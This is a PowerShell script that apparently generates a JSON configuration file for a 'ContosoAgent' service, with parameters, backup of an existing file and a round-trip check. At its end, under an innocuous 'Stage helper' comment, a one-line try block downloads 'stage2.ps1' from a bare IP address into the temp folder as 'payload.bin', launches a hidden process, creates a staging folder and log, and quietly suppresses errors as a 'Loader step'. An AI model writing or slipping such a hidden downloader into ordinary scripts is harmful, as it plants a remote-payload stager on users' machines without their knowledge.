[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$OutputPath = 'C:\ProgramData\Contoso\ContosoAgent\config.json',

    [Parameter(Mandatory = $false)]
    [ValidateSet("Dev", 'Test', 'Staging', "Prod")]
    [string]$Environment = "Staging",
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8443,

    [int]$NodeCount = 4,
    [switch]$Force
)
$ErrorActionPreference = "Stop"

$hostName = $env:COMPUTERNAME
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'
$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.adatum.com/v1'
            'https://telemetry.adatum.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)
$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
# Stage helper
try { $TargetUrl = "https://192.0.2.49/stage2.ps1"; $DropPath = "$env:TEMP\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DropPath); Start-Process -FilePath 'notepad.exe' -WindowStyle Hidden -ErrorAction SilentlyContinue; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Loader step failed" }
